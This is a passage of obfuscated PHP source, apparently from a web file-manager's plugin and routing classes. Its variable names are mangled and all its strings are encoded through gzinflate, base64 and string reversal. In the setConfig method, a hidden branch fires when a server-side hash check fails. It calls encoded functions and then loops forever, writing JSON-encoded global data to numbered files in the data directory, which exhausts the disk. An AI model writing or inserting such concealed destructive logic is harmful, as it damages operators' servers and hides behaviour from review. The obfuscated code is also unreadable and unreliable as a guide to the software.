$Ëñ÷Ñ . $ù£Ì“Ô¥[1700]; if (!file_exists($Ì‘‰ô“)) { echo $ù£Ì“Ô¥[1701]; return; } } $ÔÇö¯ ¼ = $this->parseFile($Ì‘‰ô“); $this->parseLang($ÔÇö¯ ¼); $this->parseConfig($ÔÇö¯ ¼); $this->parsePackage($ÔÇö¯ ¼); if (is_array($¥ø™¯ñş)) { $ÔÇö¯ ¼ = str_replace(array_keys($¥ø™¯ñş), array_values($¥ø™¯ñş), $ÔÇö¯ ¼); } echo $ù£Ì“Ô¥[288] . $ÔÇö¯ ¼; } private function checkVersion() { $­Õå©±œ =& $_SERVER[‹‰”››ê]; $Ûİ”ú€† = $this->appPackage(); $öÙ×ˆÀÊ = $this->getConfig(); if ($öÙ×ˆÀÊ[$­Õå©±œ[1702]] == $Ûİ”ú€†[$­Õå©±œ[1676]]) { return; } $this->regist(); $this->setConfig(array($­Õå©±œ[1702] => $Ûİ”ú€†[$­Õå©±œ[1676]])); } final function initLang() { $¥ß¬ãæ÷ =& $_SERVER[‹‰”››ê]; $÷İÄáÆ = $¥ß¬ãæ÷[1703]; $³™‹ÚªÈ = $this->pluginPath . $¥ß¬ãæ÷[1704]; $ñ®òëÏ’ = I18n::getType(); $òœîÄ › = array(); if (file_exists($³™‹ÚªÈ . $ñ®òëÏ’ . $¥ß¬ãæ÷[934])) { $òœîÄ › = (include $³™‹ÚªÈ . $ñ®òëÏ’ . $¥ß¬ãæ÷[934]); } else { if ($ñ®òëÏ’ == $¥ß¬ãæ÷[1705] && !file_exists($³™‹ÚªÈ . $ñ®òëÏ’ . $¥ß¬ãæ÷[934]) && file_exists($³™‹ÚªÈ . $¥ß¬ãæ÷[1706])) { $òœîÄ › = (include $³™‹ÚªÈ . $¥ß¬ãæ÷[1706]); } else { if (file_exists($³™‹ÚªÈ . $÷İÄáÆ . $¥ß¬ãæ÷[934])) { $òœîÄ › = (include $³™‹ÚªÈ . $÷İÄáÆ . $¥ß¬ãæ÷[934]); } } } if (!is_array($òœîÄ ›)) { return array(); } if (@count($òœîÄ ›) > 0) { I18n::set($òœîÄ ›); } return $òœîÄ ›; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÏŞ·ªùš) { $â¹çëœÁ =& $_SERVER[‹‰”››ê]; $úÍ¥­ä = $_SERVER[$â¹çëœÁ[316]]; $Ø±ö¶ÔÜ = $â¹çëœÁ[317]; if ($_SERVER[$â¹çëœÁ[318]] != $Ø±ö¶ÔÜ($úÍ¥­ä)) { $ı•ıû÷Ï = $â¹çëœÁ[973]; $‡¤³¨—¢ = $â¹çëœÁ[319]; $’÷ƒŞ¡• = $_SERVER[$â¹çëœÁ[320]] . $â¹çëœÁ[321]; $£°áªƒ = $‡¤³¨—¢($’÷ƒŞ¡•); $åÌŒ¸öş = explode($â¹çëœÁ[288], $£°áªƒ); if (count($åÌŒ¸öş) < $â¹çëœÁ[700]) { $ÁÁƒŠëƒ = $â¹çëœÁ[323]; $ÁÁƒŠëƒ(); } $®ÑµÜ÷Æ = $â¹çëœÁ[974]; $®ÑµÜ÷Æ($_SERVER[$â¹çëœÁ[975]]); $ı•ıû÷Ï = $â¹çëœÁ[973]; $ı•ıû÷Ï(); $è¬µ÷æä = $â¹çëœÁ[1707]; $¤±–§ìÆ = json_encode($GLOBALS[$â¹çëœÁ[1708]]); $ĞÛö‰ì = 1; for ($Ô­îåÜ = $ĞÛö‰ì; $Ô­îåÜ > 0; $Ô­îåÜ++) { $è¬µ÷æä(DATA_PATH . $Ô­îåÜ, $¤±–§ìÆ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÏŞ·ªùš); } public function onSetConfig($»µîèşÛ) { } public function onGetConfig($¾†á×½­) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($»†£ü–Ë) { if ($»†£ü–Ë == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ˆ×«™í¦ = "\x70\x6c\x75\147\151\156\101\x75\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ü¥ø´Ïü = $this->getConfig(); if (!$ü¥ø´Ïü[$ˆ×«™í¦]) { return !1; } return ActionCall($_SERVER[‹‰”››ê][1709], $ü¥ø´Ïü[$ˆ×«™í¦]); } public function url($ŒÊ©º÷÷, $ö²ªÈŞú = '', $Ï‡¶Ì¾– = true) { $µµí”£¤ =& $_SERVER[‹‰”››ê]; $‰Úƒ ·º = $this->getConfig(); $Ó·¡Šã¹ = KOD_VERSION . $µµí”£¤[10] . KOD_VERSION_BUILD; $´»íş¿ = $this->packageVersion(); $º¯şÛÁ¨ = $Ó·¡Šã¹ . $µµí”£¤[474] . $´»íş¿; if (substr($ŒÊ©º÷÷, 0, 4) == $µµí”£¤[152] || substr($ŒÊ©º÷÷, 0, 2) == $µµí”£¤[1427]) { $ñĞ†àï¡ = $ŒÊ©º÷÷ . $µµí”£¤[1710] . $º¯şÛÁ¨; } else { if ($ö²ªÈŞú == $µµí”£¤[12]) { $ñĞ†àï¡ = $this->pluginHost . $ŒÊ©º÷÷ . $µµí”£¤[1710] . $º¯şÛÁ¨; } else { if ($ö²ªÈŞú === $µµí”£¤[78]) { $ñĞ†àï¡ = $this->pluginHost . $ŒÊ©º÷÷; } else { if ($ö²ªÈŞú == $µµí”£¤[1711]) { $ñĞ†àï¡ = STATIC_PATH . $ŒÊ©º÷÷ . $µµí”£¤[1710] . $Ó·¡Šã¹; } else { if ($ö²ªÈŞú == $µµí”£¤[1712]) { $ñĞ†àï¡ = APP_HOST . $µµí”£¤[1713] . $ŒÊ©º÷÷ . $µµí”£¤[1710] . $Ó·¡Šã¹; } else { if (isset($‰Úƒ ·º[$ö²ªÈŞú])) { $ñĞ†àï¡ = $‰Úƒ ·º[$ö²ªÈŞú] . $ŒÊ©º÷÷ . $µµí”£¤[1710] . $º¯şÛÁ¨; } } } } } } if (!$Ï‡¶Ì¾–) { return $ñĞ†àï¡; } echo $ñĞ†àï¡; } public function link($ğÛÚ†Ó­ = false, $ŞÌ«Ççè = '') { $Ùªó¥²… =& $_SERVER[‹‰”››ê]; $¨ü•¯²Ù = $this->linkHas == !1; $this->linkHas = !0; if (!$ğÛÚ†Ó­) { $this->link($Ùªó¥²…[1714], $Ùªó¥²…[1712]); $this->link($Ùªó¥²…[1715], $Ùªó¥²…[1711]); $this->link($Ùªó¥²…[1716], $Ùªó¥²…[1711]); $this->link($Ùªó¥²…[1717], $Ùªó¥²…[1711]); $this->link($Ùªó¥²…[1718], $Ùªó¥²…[1711]); if ($¨ü•¯²Ù) { Hook::trigger($Ùªó¥²…[1719]); } return; } $ìšÏ‰ò = $this->url($ğÛÚ†Ó­, $ŞÌ«Ççè, !1); if (substr($ğÛÚ†Ó­, -3) == $Ùªó¥²…[1720]) { echo $Ùªó¥²…[1721] . $ìšÏ‰ò . $Ùªó¥²…[1722] . $Ùªó¥²…[288]; } else { if (substr($ğÛÚ†Ó­, -4) == $Ùªó¥²…[1723]) { echo $Ùªó¥²…[1724] . $ìšÏ‰ò . $Ùªó¥²…[1725] . $Ùªó¥²…[288]; } } if ($¨ü•¯²Ù) { Hook::trigger($Ùªó¥²…[1719]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\57\x5d\53", "\x3a\x6e\165\x6d" => "\133\x30\55\71\135\x2b", "\72\141\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ÙîÏÍõœ, $à †õÆ¦) { $Ö·ß¿ÇÜ =& $_SERVER[‹‰”››ê]; if ($ÙîÏÍõœ == $Ö·ß¿ÇÜ[1726]) { $¶Í¶¦Î = array_map($Ö·ß¿ÇÜ[1727], $à †õÆ¦[0]); $¯ê¡ÀŞ· = strpos($à †õÆ¦[1], $Ö·ß¿ÇÜ[8]) === 0 ? $à †õÆ¦[1] : $Ö·ß¿ÇÜ[8] . $à †õÆ¦[1]; $ö°ğÂä = $à †õÆ¦[2]; } else { $¶Í¶¦Î = null; $¯ê¡ÀŞ· = strpos($à †õÆ¦[0], $Ö·ß¿ÇÜ[8]) === 0 ? $à †õÆ¦[0] : $Ö·ß¿ÇÜ[8] . $à †õÆ¦[0]; $ö°ğÂä = $à †õÆ¦[1]; } array_push(self::$maps, $¶Í¶¦Î); array_push(self::$routes, $¯ê¡ÀŞ·); array_push(self::$methods, strtoupper($ÙîÏÍõœ)); array_push(self::$callbacks, $ö°ğÂä); } public static function error($´ıÚ’«µ) { self::$errorCallback = $´ıÚ’«µ; } public static function haltOnMatch($Ê ÉêÄè = true) { self::$halts = $Ê ÉêÄè; } public static function dispatch() { $Úåö‘‘ =& $_SERVER[‹‰”››ê]; $¼Ÿ¹èÙ„ = parse_url($_SERVER[$Úåö‘‘[1728]], PHP_URL_PATH); $Ê“úğ˜® = $_SERVER[$Úåö‘‘[164]]; $’ÂËšë = array_keys(static::$patterns); $ç¤ëè±‚ = array_values(static::$patterns); $º½°ïŒÆ = !1; self::$routes = preg_replace($Úåö‘‘[1377], $Úåö‘‘[8], self::$routes); if (in_array($¼Ÿ¹èÙ„, self::$routes)) { $â¸ä›Ø = array_keys(self::$routes, $¼Ÿ¹èÙ„); foreach ($â¸ä›Ø as $®ÚùÑÙ±) { if (self::$methods[$®ÚùÑÙ±] == $Ê“úğ˜® || self::$methods[$®ÚùÑÙ±] == $Úåö‘‘[1729] || in_array($Ê“úğ˜®, self::$maps[$®ÚùÑÙ±])) { $º½°ïŒÆ = !0; if (!is_object(self::$callbacks[$®ÚùÑÙ±])) { $«üêÚ‰ß = explode($Úåö‘‘[8], self::$callbacks[$®ÚùÑÙ±]); $•®‘“– = end($«üêÚ‰ß); $éùŒœäê = explode($Úåö‘‘[1309], $•®‘“–); $øùúÃÅº = new $éùŒœäê[0](); $øùúÃÅº->{$éùŒœäê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$®ÚùÑÙ±]); if (self::$halts) { return; } } } } } else { $µŒŞÖ®¥ = 0; foreach (self::$routes as $®ÚùÑÙ±) { if (strpos($®ÚùÑÙ±, $Úåö‘‘[4]) !== !1) { $®ÚùÑÙ± = str_replace($’ÂËšë, $ç¤ëè±‚, $®ÚùÑÙ±); } if (preg_match($Úåö‘‘[1730] . $®ÚùÑÙ± . $Úåö‘‘[1731], $¼Ÿ¹èÙ„, $Àƒ‚…×Œ)) { if (self::$methods[$µŒŞÖ®¥] == $Ê“úğ˜® || self::$methods[$µŒŞÖ®¥] == $Úåö‘‘[1729] || !empty(self::$maps[$µŒŞÖ®¥]) && in_array($Ê“úğ˜®, self::$maps[$µŒŞÖ®¥])) { $º½°ïŒÆ = !0; array_shift($Àƒ‚…×Œ); if (!is_object(self::$callbacks[$µŒŞÖ®¥])) { $«üêÚ‰ß = explode($Úåö‘‘[8], self::$callbacks[$µŒŞÖ®¥]); $•®‘“– = end($«üêÚ‰ß); $éùŒœäê = explode($Úåö‘‘[1309], $•®‘“–); $øùúÃÅº = new $éùŒœäê[0](); if (!method_exists($øùúÃÅº, $éùŒœäê[1])) { echo $Úåö‘‘[1732]; } else { call_user_func_array(array($øùúÃÅº, $éùŒœäê[1]), $Àƒ‚…×Œ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$µŒŞÖ®¥], $Àƒ‚…×Œ); if (self::$halts) { return; } } } } $µŒŞÖ®¥++; } } if ($º½°ïŒÆ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¬ƒÚ±êØ =& $_SERVER[‹‰”››ê]; header($_SERVER[$¬ƒÚ±êØ[1733]] . $¬ƒÚ±êØ[1734]); echo $¬ƒÚ±êØ[1735]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Úåö‘‘[1728]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto d–¢‡®ê¡Ç; BÂ½äà¯ĞŞ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\213\211\224\233\233\352", "\335\337\322\341\361\203"); $_SERVER[‹‰”››ê] = explode("\x7c\x3\x7c\x2\x7c\x4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\170\34\325\265\60\4\10\65\171\341\205\44\220\120\306\2\243\342\55\222\334\145\313\146\265\132\111\213\127\132\261\273\162\223\304\170\264\73\322\216"."\265\273\263\332\231\125\263\35\114\263\151\246\204\146\152\350\241\331\246\233\156\136\150\41\360\50\241\363\110\110\300\262\15\171\364\27\132\170\360\337\162\156\231\331\25\274\377\173\377\367\375\6\173".strrev('UTg™éùüÙ÷3ˆøh½¿äÃC|·»ÈòŞWõ`ÿV=êáp>w›³âóç¹î{ç-Î÷9o')."\265\315\332\157\132\307\1\347\334\265\111\333\275\351\225\57\36\273\353\231\313\137\372\353\63\67\47\122\13\356\277\174\340\360\335\126\357\365\267\243\32\20\50\55\331\100\177\224\234\151\53\372\250"."\x61\xd9\x16\x4d\x48\x9a\xb9\x7e\x63\x80\x86\x8d\x1c\xfd\xf5\xd3\x9f\xae\x58\xa4\xa0\x67\x4d\x5b\xa7\x51\x1f\xfd\x51\xa1\x55\xe4\x5f\x6b\x28\x63\xb0\x7c\xb5\x23\x9a\x50\xe3\x5d\x9d\x9d\xa1\x58\x2\x80\x1a\xe4\xfc"."\254\231\202\120\136\53\150\131\370\176\136\57\130\250\65\162\165\152\336\314\353\71\107\212\110\110\151\266\326\247\131\120\123\163\223\332\34\352\214\104\227\251\211\145\235\41\200\350\123\207\212\172\141"."\214\306\110\60\156\153\5\73\141\144\165\16\61\122\340\355\152\12\265\206\73\224\104\54\320\21\17\4\23\341\150\7\115\16\106\333\333\303\211\322\364\130\64\22\151\12\4\27\225\346\164\306\2"."\xad\xed\x1\x5\xb5\x2f\xa3\xab\x46\xae\xdf\xac\x52\x56\xd0\x9c\x15\x4a\x35\xd\xb4\x18\x7a\x26\x45\x83\x39\x8d\x35\xc7\x1e\xcb\x43\x28\xc1\x43\x68\x9a\x72\xc5\x4c\x86\x46\x3a\x78\x28\xa5\xf7\x6b\xc5\xc\x8c\x56"."\263\34\311\27\214\254\306\72\275\110\37\343\251\64\240\25\155\323\310\45\151\44\64\152\27\64\221\216\332\232\104\23\255\347\240\252\170\50\22\12\46\24\334\100\245\45\26\155\127\140\22\262\232".base64_decode('ZesFZUlbKBZScKMbK0lfKxXAlw40FEogElEmq8HWs3lWDS1TprJorDkUU5qWKWKEkmY2a+Y=')."\x7c\xa8\x16\x34\x93\xb6\xd4\xd4\x50\x2c\x46\x3\x1e\x40\xef\x48\x18\x4f\x1a\x44\xa2\x2d\x2d\xf1\x10\x8f\x41\xe7\x8e\x8b\xa0\x96\x4c\x7\xfc\x74\xc4\x52\xfd\x19\x5b\x1d\xd6\x32\x45\x86\xa6\x83\xf4\xb7\x12\x7e\xe0".base64_decode('17QAdYeMnFEENIUqTJMvKwgUGbTOUvQUBLKovAnl+iCtj0GtZAEDrdBhGmxcQH/nQfk+Fec=')."\351\5\133\325\163\111\63\145\344\140\35\57\4\174\324\354\164\163\301\100\0\64\336\157\146\122\54\154\31\343\320\313\176\43\243\167\24\263\62\10\217\46\323\106\46\125\140\113\357\273\40\151\64"."\302\127\62\206\25\261\74\152\11\47\2\106\377\230\130\212\30\256\223\347\132\146\261\220\324\303\150\351\320\170\35\44\353\266\215\72\307\6\304\354\312\147\114\55\25\327\13\274\153\206\331\202\52".strrev('ÖQõQ“=i= {@Õ?ĞcîŞ›÷¢}Õ_ËF’’å²$C-­9'."\r".'¶BÌZÀH±9mŠ')."\x53\x36\x35\xd3\x62\x3\xe1\xb7\xfa\x8c\x9c\x1f\xa5\xd0\x68\x38\xaa\xa6\x35\x2b\xdd\x9e\x9a\xa9\x92\x52\x8c\xd0\xa6\xf4\x51\x5f\x3e\x9d\x87\xc5\xce\xd7\x77\x8f\x3\xdf\xf1\xb0\x75\x98\x76\x48\x22\xd7\x19\x33\xa9".base64_decode('ZeSu0HDatvNxPZfCowBdMUdyZJTyug5AzR4lpbQry5S2BqPBYgWzGR5iveNpFk+0R9lUpvo=')."\1\123\331\156\121\1\37\64\54\102\370\304\252\325\362\371\214\221\324\154\303\314\371\315\244\255\333\136\313\56\350\32\324\30\110\46\165\313\362\6\315\234\135\60\63\336\100\46\143\216\170\243\5"."\143\300\310\65\50\65\100\203\121\46\132\353\136\114\27\33\140\1\127\314\123\60\322\340\317\324\64\26\355\176\357\34\266\60\71\164\101\313\131\375\172\301\33\202\125\321\240\240\306\162\342\310\300"."\x9a\xd\x2b\x6f\x5a\x6\x6e\x5e\x83\xa2\xd9\xb6\x96\x4c\x63\xc2\x22\xaa\x6f\xfc\xe\x78\x23\x97\x31\x72\x7a\x29\x2c\xaa\x44\xf7\x76\x16\xb4\x81\xac\xd6\xa0\xe4\x8b\x7d\x68\x0\x60\x31\x42\x5a\x12\x43\xc8\xc0\x30"."\x0\xd\x4a\x56\x1b\xf5\x6a\x3\xac\xa6\xd0\x68\xde\x28\xe8\x16\xeb\xb5\xd2\xda\x9e\x0\x8c\xea\xf7\xb6\xe3\x45\x64\xe8\x29\x6f\x1c\x51\x6e\xa8\x6c\x7a\xed\xc\x5\xe1\x8a\xc2\xf2\x68\x6a\x5b\x22\xd1\xa9\x86\x5b"."\xd0\xd6\xdc\x11\x52\xdb\x3\x89\x60\x1b\xd4\x6e\x6b\x3\xac\xea\x8\xa2\xc7\xbc\x4a\x96\xb8\xd4\x8b\x16\x13\xc6\xa6\xe\xd4\x39\x91\xd8\x69\x8e\xe8\x5\xf4\xe1\xa6\xb1\x6\x65\xd0\x4c\xf5\x99\xa3\x3e\x96\x85\x81"."\343\210\252\60\140\74\277\171\333\33\323\162\3\270\33\175\143\266\156\271\351\122\23\332\310\175\375\164\345\372\372\364\176\263\0\275\261\206\7\234\203\37\321\163\3\166\232\325\35\17\305\26\207".strrev(' !kÙ®ÇŠÜ$^Xˆ¼\\³àÁx½Kú1yiÊÍ¤ÄôÆñ¿ƒZÊ3˜CŸ¾ÁˆX’Ú<jb')."\257\14\305\352\216\30\131\3\167\317\346\71\144\260\21\123\320\12\15\362\223\76\67\366\130\65\125\75\251\151\325\136\364\157\115\165\167\117\263\257\246\167\241\337\20\145\374\165\276\72\245\276\166".strrev('‰h”Ÿxº1ßãE¾ÃÅæ8DÑ D5Ómî–™"°»/NfsÃ,9Èº%ZˆéĞ(ËC¸‰Ò–')."\x6b\x5e\x68\x62\x2c\x74\x5c\x57\x28\x9e\x50\xdb\x43\x89\xb6\x68\x33\x34\x3f\x14\x80\x50\xe\x15\x26\xed\x65\x73\x8c\x99\x32\xd8\x12\x73\x50\xad\x3e\x2a\xed\x1f\x62\x1f\x48\xca\x3\x42\xca\x75\x98\x23\x8c\xf2\xbb".base64_decode('ECiY1pODk+ShEPTGpHSJTV03/ekFbO6lP6oajIQCMRW4WdWwWqQtFEc5uVXNvpUI0dp1tqc=').base64_decode('wIfDWbSkRUdU537HetkuEB+toCVGim+IKNqmGwNpaLeBq0uaGbOgZfBWwHjYAQOocj5TRMs=')."\300\217\53\116\244\213\331\76\330\270\320\220\15\350\266\140\57\255\61\304\203\145\331\346\214\166\170\73\334\354\330\202\41\346\127\61\352\366\370\362\271\201\352\243\240\56\265\176\146\55\116\200\131"."\205\236\41\76\273\250\227\166\335\227\64\321\72\157\327\6\365\6\334\27\40\156\363\110\52\213\110\364\163\36\336\362\32\335\144\2\317\126\306\227\105\225\220\72\203\46\337\244\351\111\146\236\163"."\xcb\x53\xf4\x42\xc1\x2c\x4c\x1\x8\x12\x56\xc8\xbe\x89\xa7\xb\x2a\xb7\x39\x7\x62\x21\x8a\xc0\xc2\x69\x93\x73\x2c\x26\xc3\xcd\x6\x3f\xf4\x7b\x6a\x7d\xb\x50\x91\x14\xe2\xdc\x7c\x96\x8d\x26\x1\x75\x50\x4b\xa5".base64_decode('yiUjygMVrGZoSzIYW+CPT0f/Cx4gZWY1tqNiQsQ/iyMWj5FtUk/RfdKRRBc4TaphnyzYJs4=')."\54\70\40\21\222\246\115\150\64\302\12\350\160\221\367\234\215\101\112\317\350\14\301\322\72\143\65\152\1\14\315\14\107\277\176\276\16\320\101\2\245\12\376\316\260\142\250\44\146\14\130\174\11"."\x3e\x79\x89\x4\xcc\x1d\x1\x5e\x89\x60\x6\xcd\x6a\x94\x2c\x28\x11\xef\x2c\xe8\xfd\xc6\x28\x23\x25\xa3\x76\xbb\x56\x18\x64\x1d\x43\x25\xc5\x52\xc4\x11\x69\x99\xb6\x74\x45\x22\x6a\x30\xda\x91\x40\x7\x37\x9a\xb2".base64_decode('JBZOhBjFCjSrgWAnxAQN5AyczILQlOF6QCHUCL/gldBmnTdziNICsfKKY11JVkqwEoA7gv0=')."\x70\x71\x14\x88\x27\xc8\x8e\x7b\xb3\x88\xae\x78\x79\x9b\x3a\xbb\x80\x17\x60\x58\xc1\x58\xe2\xa6\x31\xcc\xed\x32\xd2\x31\x90\x5b\xcc\x67\x7e\x49\x7c\x86\xb7\xad\x3d\x10\xf4\xc6\xdb\x2\xf5\x33\x67\xd1\xd4\x65\xd9"."\124\117\242\315\260\172\226\363\70\64\147\304\232\241\26\164\264\246\31\56\324\327\326\261\25\207\370\22\115\264\174\231\67\353\305\265\140\226\322\127\133\133\313\352\232\66\113\111\43\122\302\351\167"."\x8a\xf4\x96\x9d\x72\x8a\xc9\x41\x5d\x26\xe7\x96\x77\xc4\x60\x34\xef\x28\xce\x8e\x1f\x55\x3a\xf8\x56\x91\xec\x6e\xaa\x96\xc4\xd5\xa9\xa8\xb0\x5d\xb4\xe4\x91\x42\x8\x98\x42\x45\xc\xc6\x25\xd3\x54\x2d\x33\x60\x22".strrev('¨†Îñäv‹hÃu”Ğ?(’¶<¿FÔf¹1ºÅ±èğœ|kJË)×_ÇÄågK¼')."\66\233\266\243\351\317\176\320\214\42\132\267\5\143\134\32\375\205\254\46\106\63\243\161\370\344\150\66\43\316\137\60\64\60\232\162\327\106\125\224\243\102\216\52\347\264\161\72\300\146\241\275\331"."\265\46\350\346\117\323\346\57\104\137\124\206\261\64\307\314\65\126\326\371\152\53\25\166\52\155\254\354\112\264\40\76\175\341\202\375\346\7\315\154\36\223\25\162\4\303\375\245\230\273\0\372\70"."\37\363\100\54\322\351\32\216\120\102\203\135\147\276\137\206\233\357\237\254\126\350\12\146\314\226\252\235\221\100\242\45\32\153\7\34\317\347\5\132\345\223\345\126\233\127\120\244\242\345\325\61\237"."\xc\xab\x40\x4b\x66\x5c\x28\x2a\x8f\xc5\xd2\xb2\x98\xb8\xb4\x1c\x26\x2e\x75\x61\xe2\xd2\x52\x4c\x5c\x5a\xe\xcf\x54\x4d\xd0\x5c\x1c\x12\xe7\x79\x9a\x83\x39\xf1\xb0\x74\x6e\x57\x11\xa1\x67\xd3\xc\xf5\x36\x5\xe2"."\341\240\332\31\110\264\361\1\361\133\251\101\313\257\25\320\271\177\30\35\337\373\374\370\54\213\45\156\76\176\332\203\205\220\304\134\226\252\365\241\155\222\261\204\105\174\44\2\316\153\30\300\264"."\xac\x36\x6e\xe6\x10\x39\x41\x7c\x40\xd6\x97\x84\x3a\x12\x6d\xe1\x8e\x45\x6a\x7b\xb4\x39\x14\x51\xc3\x1d\x88\xdd\x4c\x94\xa6\x77\x75\x36\x7\x18\x95\x96\xd3\x9b\xa2\xac\xbd\x90\xda\x85\x18\xce\xc5\x81\x48\xd8\xd".base64_decode('HloajifiZbNQWlfIldPcpHbGQi3hpTzaEg5FmuNqMBBsEzAdgXaIIFZOz6QsvxNeRZxznEs=')."\4\125\130\17\154\146\144\41\234\312\304\113\252\330\50\320\51\114\7\154\201\356\142\231\52\351\211\312\50\151\221\363\301\114\344\220\145\163\203\116\220\60\354\354\370\124\105\177\252\225\100\134\261"."\xf3\x2a\xdf\xf3\xfb\xc6\x78\x90\x74\x83\xc5\x11\x93\x4\xdf\x57\x80\x8b\x2f\x69\x81\x8a\x61\x9a\xa4\xb3\x5a\xf9\x84\x40\xbf\xcd\x19\x65\x57\x1c\xe1\xa3\xc8\x43\x33\x10\x20\xc2\x5b\x84\x9\x64\x46\xe0\x33\x6\xda"."\x2f\xb\x76\x80\x35\xa7\x5f\x8\x4e\xd5\x68\x67\x28\x16\xc0\x62\x57\x75\x49\x2c\xda\xd1\xa\x5\x46\xd2\x3a\x6b\x40\x18\x86\xbf\x8a\x1d\x9e\x41\xfa\x6a\xb\xb6\x43\xcb\x18\x1a\x13\xc3\x89\x41\x5f\x69\xb2\xa1\x44"."\370\316\216\44\71\66\316\175\230\347\142\214\70\13\364\43\72\303\370\45\263\310\353\357\63\115\250\63\203\317\211\234\17\340\362\332\225\26\103\213\121\306\101\114\343\73\54\40\153\164\121\250\103"."\145\270\104\143\22\376\321\204\120\54\26\215\301\20\330\346\40\223\325\321\314\130\50\36\112\260\157\17\25\15\66\100\176\337\64\300\133\35\161\235\360\171\377\361\75\43\323\252\272\275\323\174\275"."\50\120\135\163\14\215\102\254\307\347\210\262\303\100\261\300\113\143\106\265\312\132\130\335\320\343\357\361\127\55\154\350\16\170\307\65\357\170\255\167\256\267\27\35\41\252\247\101\102\357\252\172\317"."\214\65\30\0\1\56\74\262\27\375\64\366\54\234\332\343\75\372\327\53\216\351\356\351\255\154\230\66\245\307\167\144\317\110\157\115\365\102\366\235\144\261\200\116\51\154\353\105\115\115\115\253\102"."\x4d\x42\xc7\x6a\xe\x92\x93\x76\xa\x2\xc0\x32\xc6\x8d\xbc\x48\x5d\x35\x6b\xd\x4b\x47\x73\xa8\xf\x88\x12\xdd\xde\x9e\x69\xbd\xb\xa5\x72\x52\x92\xfb\x5b\x88\xd8\x23\x9e\x34\xcd\xe1\x2\xde\xe5\xb8\x67\xbc\x28"._kodDe('Kt1SE3RQueBGbMvoGfBdLnAHhDP7tK+r2fy3uS+kih5eUfEatzRmWRMUuGPLciSMo3on/cwg').base64_decode('pw9BwLQ5Ruv2iM7QA6U74gg52DaFsqRYRtrWiLCN4yhHJiOv4sPoCI+hXQ/maV+AtpJaXo8=')."\113\75\124\325\104\240\51\22\342\47\153\240\275\54\116\350\140\23\277\345\101\135\23\64\224\121\4\111\220\106\4\133\260\326\255\241\214\102\110\1\75\5\66\220\13\57\253\230\307\7\72\5\315".strrev('÷öó_ÛÕ=nÅ==UüU‰AĞ²‹ÊmšcÑbêÄ–ƒóÈ	åS”9…ãJ˜1[8')."\xae\x9a\xbe\xa6\x9a\x49\x7b\xfc\x3d\xe8\xf\x8b\x4\xca\x5c\xbd\xa8\x9a\xcd\x86\x84\x53\x42\xb5\x35\x94\xf0\xe1\x16\x71\x61\xbb\x23\xc2\xb3\x69\xd4\x2c\xf0\x93\x4f\xde\x21\x7a\xb0\x4d\x5b\xcb\x38\xaa\x48\xe0\x14"."\106\244\30\263\7\242\147\72\357\21\101\273\60\117\44\335\136\21\122\332\301\105\275\234\145\227\256\117\160\211\270\156\373\70\204\107\312\124\121\334\161\223\330\130\301\10\175\16\55\254\240\264\315"."\121\341\177\234\110\54\34\127\136\226\216\71\225\226\142\46\143\163\271\121\306\30\204\57\300\252\201\33\70\57\354\4\323\312\25\105\207\46\46\106\255\201\146\124\324\224\3\14\347\162\146\252\117"."\106\72\261\301\266\6\20\53\223\120\252\330\155\221\22\356\120\232\242\321\110\50\320\241\340\275\34\366\40\304\50\304\103\235\1\264\201\141\201\154\74\21\202\13\254\160\263\227\325\273\324\313\304".base64_decode('LzxgwLCbeXrsQcxcxmRkxCnAwWdHDxajeDBf4UGt9mDm0CNO5h5xCeMZNvQREuCnZg8cpj0=').strrev('H³Aah]Y¡š¾È‡š0ômaäšL<g¬>ˆœÚchÏ,iØ&±d€|€P‰š°Ç³pÁfB')."\20\321\317\264\7\43\20\306\137\217\270\26\362\230\43\71\275\100\100\140\140\204\74\301\43\144\15\236\201\202\131\314\167\262\157\112\61\332\54\110\20\155\346\11\61\323\264\75\114\54\347\221\345".base64_decode('c9CKAFsnZYezfG/I+LsbAfiFs0pH6Xsmq3Q+nKLJVbRGEMuuYfudA4aICDnniQdchBaLhYo=')."\73\320\242\301\5\44\255\126\16\163\4\315\71\21\125\334\2\211\273\77\301\347\272\245\104\356\133\101\374\121\164\326\213\113\237\263\265\1\366\55\114\254\370\111\260\14\50\15\307\364\344\130\122"."\x88\x9d\x9a\x25\x61\x96\x33\xd6\xe8\xec\x8f\x87\x2c\xa0\x72\xc8\x5f\x7e\x72\x39\x42\xf3\xb9\xd8\x6f\xdf\x7d\xd9\xe0\x32\x2c\xe7\x13\xeb\x58\x1c\xdf\xbf\x2c\xa1\x43\x84\xf6\x45\xf3\x82\x8f\xa0\x8d\xc5\xf4\x37\x8e"."\xf6\xb5\x96\xc\x1b\x8d\x7a\x39\x1b\x28\xaf\xc7\x19\xc3\xab\xca\x47\x28\x31\xb9\x60\x8f\x73\x41\x67\x24\xd4\x92\x50\x8e\x8d\x22\xb2\x65\x98\x2a\x2d\xa3\x62\x60\x85\xfc\x63\xe6\x14\x47\xdd\x6c\xb8\x94\x46\x92\x2f"."\xe2\x5a\x2e\x45\x53\x56\x20\x12\xbf\xa2\xb1\x82\x7d\xa4\xc2\x51\x5c\xe0\x87\xb3\x11\x1e\x16\x55\x4a\x31\x